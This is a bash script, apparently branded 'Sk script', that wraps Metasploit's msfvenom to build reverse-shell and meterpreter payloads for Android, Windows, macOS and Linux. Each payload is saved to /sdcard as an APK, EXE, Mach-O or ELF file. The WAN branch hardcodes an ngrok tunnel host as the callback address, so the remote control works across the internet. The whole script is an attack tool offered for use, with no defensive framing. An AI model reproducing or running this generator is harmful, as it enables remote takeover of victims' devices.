echo -e "$red [ # ] Metasploit Directory Must be in Home..."
echo -e "$cyan Pls Select Network type"
echo -e "$green 1-> WAN"
echo -e "$green 2-> LAN"
read -p 'Choice: ' lw
if [ $lw = '2' ];
then
echo -e "$cyan Pls Select Platform Of Payload"
echo -e "$green 1-> Android"
echo -e "$green 2-> Windows"
echo -e "$green 3-> Mac"
echo -e "$green 4-> Linux"
echo -e "$green 5-> Exit"
echo -e "$cyan"
read -p 'Choice:' ch2
if [ $ch2 = '5' ];
then 
echo -e "$blue Bye Bye..... "
clear
fi
if [ $ch2 = '4' ];
then
read -p 'Pls Enter LHOST:' lhost
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
ruby msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /sdcard/sklinux.elf
echo -e "Payload name is $cyan sklinux.elf"
echo -e "$green Payload Saved In Sdcard"
fi
if [ $ch2 = '3' ];
then
read -p 'Pls Enter LHOST:' lhost
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
ruby msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /sdcard/skshell.macho
echo -e "Payload name is $cyan skshell.macho"
echo -e "$green Payload Saved In Sdcard"
fi
if [ $ch2 = '2' ];
then
read -p 'Pls Enter LHOST:' lhost
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/skshell.exe
echo -e "Payload name is $cyan skshell.exe"
echo -e "$green Payload Saved In Sdcard"
fi
if [ $ch2 = '1' ];
then
read -p 'Pls Enter LHOST:' lhost
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/skapp.apk
echo -e "Payload name is $cyan skapp.apk"
echo -e "$green Payload Saved In Sdcard"
fi
fi
if [ $lw = '1' ];
then
echo -e "$cyan Pls Select Platform Of Payload"
echo -e "$green 1-> Android"
echo -e "$green 2-> Windows"
echo -e "$green 3-> Mac"
echo -e "$green 4-> Linux"
echo -e "$green 5-> Exit"
echo -e "$cyan"
read -p 'Choice:' ch2
if [ $ch2 = '5' ];
then 
echo -e "$blue Bye Bye..... "
clear
fi
if [ $ch2 = '4' ];
then
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
ruby msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport -f elf > /sdcard/sklinux.elf
echo -e "Payload name is $cyan sklinux.elf"
echo -e "$green Payload Saved In Sdcard"
fi
if [ $ch2 = '3' ];
then
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
ruby msfvenom -p osx/x86/shell_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport -f macho > /sdcard/skshell.macho
echo -e "Payload name is $cyan skshell.macho"
echo -e "$green Payload Saved In Sdcard"
fi
if [ $ch2 = '2' ];
then
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport -f exe > /sdcard/skshell.exe
echo -e "Payload name is $cyan skshell.exe"
echo -e "$green Payload Saved In Sdcard"
fi
if [ $ch2 = '1' ];
then
read -p 'Pls Enter LPORT:' lport
echo -e "$grey [*] Please Wait Loading ..."
cd $HOME
cd metasploit-framework
msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$lport R > /sdcard/skapp.apk
echo -e "Payload name is $cyan skapp.apk"
echo -e "$green Payload Saved In Sdcard" 
fi
fi
echo -e "$grey  ___________ "
echo -e "$cyan /   _____/  | __ "
echo -e "$blue \_____   \| |/ / "
echo -e "$yellow  /        \   <  "
echo -e "$cyan /_______  /__|_ \ "
echo -e "$grey         \/     \/ "
#echo "Official Sk scriptÂ©"
